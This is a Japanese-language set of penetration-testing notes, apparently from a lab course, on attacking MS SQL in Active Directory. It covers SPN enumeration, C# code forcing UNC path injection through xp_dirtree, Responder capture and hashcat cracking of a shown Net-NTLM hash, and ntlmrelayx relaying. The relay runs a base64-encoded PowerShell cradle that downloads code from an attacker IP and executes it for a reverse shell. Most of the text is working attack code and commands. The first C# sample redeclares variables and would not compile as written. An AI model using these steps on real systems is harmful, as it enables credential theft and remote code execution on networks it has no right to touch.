# Enumeration
Active Directory環境でMS SQLのインスタンスを見つけるより目立たない方法は、ドメインコントローラーに対してMS SQLに関連するすべての登録済みSPNを問い合わせること

`setspn`の実行
```powershell
setspn -T DOMAIN -Q MSSQLSvc/*
```

GetUserSPNsによる列挙
https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
```powershell
powershell -ep bypass
. .\GetUserSPNs.ps1
```


# Authentication
ログインするとデータベースユーザアカウントにマッピングされる

組み込みSQLサーバシステム管理者（sa）アカウント->`dbo`ユーザカウント
対応するアカウントをも持たないアカウント->`guest`ユーザアカウント

`dbo`（データベースオーナー）はsysadminロールを持ち、SQLサーバの管理者

現在のADのアカウントでログインして、どのアカウントにマップされるのか、パブリックロールかsysadminロールかを調べるコード
```c#
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
              con.Open();
              Console.WriteLine("Auth success!");
            }
            catch
            {
              Console.WriteLine("Auth failed");
              Environment.Exit(0);
            }
            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();
            
            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if(role == 1)
            {
              Console.WriteLine("User is a member of public role");
            }
            else
            {
              Console.WriteLine("User is NOT a member of public role");
            }
            reader.Close();
            
            String querypublicrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if(role == 1)
            {
              Console.WriteLine("User is a member of sysadmin role");
            }
            else
            {
              Console.WriteLine("User is NOT a member of sysadmin role");
            }
            reader.Close();
            
            con.Close();
        }
    }
}
```

# Responder+ UNC Path Injection
QLサーバーに対して、自分たちが制御するSMB共有へのNTLM認証を強制し、SQLサーバーが動作しているコンテキストのユーザーアカウントのハッシュを取得する

SQLサーバーにKaliマシン上のSMB共有への接続要求を強制するには`xp_dirtree`というSQLプロシージャを使用

###  UNCパスの形式について
ホスト名がIPアドレスとして指定された場合、WindowsはKerberos認証ではなく、自動的にNTLM認証にフォールバック
```
\\hostname\folder\file
```

## 実行コード
```c#
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
           
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            
            con.Close();
        }
    }
}
```

## responder
kali側でresponderを実行
```sh
sudo responder -I tun0
```

以下の形式のNet-NTLMハッシュをクラック
```
sqlsvc::CORP1:2f6c6475053e92cc:56335D1CE7EACE603C8E53160F2C0CB0:010100000000000000AE5E3B47A2DB0173F558D7AC02C1D2000000000200080055004C004A00450001001E00570049004E002D005300590049004900540058004100550051005200350004003400570049004E002D00530059004900490054005800410055005100520035002E0055004C004A0045002E004C004F00430041004C000300140055004C004A0045002E004C004F00430041004C000500140055004C004A0045002E004C004F00430041004C000700080000AE5E3B47A2DB0106000400020000000800300030000000000000000000000000300000950AC34C17D2661DF2224D35978D49FB2865C883BCB030892AB304987F33850F0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200350031002E003100350031000000000000000000
```

hashcatを使用
```sh
hashcat -m 5600 hash.txt dict.txt --force
```

## Relay Mt Hash (ntlmrelayx + UNC Path Injection)
Net-NTLMハッシュはpass-the-hash攻撃には使用できないが、別のコンピューターへリレー(中継)することは可能

> [!WARNING]
> Net-NTLMハッシュを、同じプロトコルを使って元のコンピューターへリレーし返すことはできません。これは2008年にMicrosoftによってブロックされたためです。

SMBに対するNet-NTLMリレーは、SMB署名(SMB signing)が有効になっていない場合にのみ可能

powershellのダウンロードクレードルをbase64エンコードしておく
pythonによるエンコードコマンド(run1.txtはシェルコードランナー)
```sh
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://192.168.45.215/run1.txt\\') | IEX'.encode('utf-16le')).decode())"
```

ntlmrelayx + powershell実行
```sh
sudo impacket-ntlmrelayx --no-http-server -smb2support -t リレー先IP -c 'powershell -enc BASE64'
```

UNC Path Injection実行するとシェルコード実行されてリバースシェルが返ってくる
今回の想定としてはMSSQL -> APPSRV01(SMB署名無効化)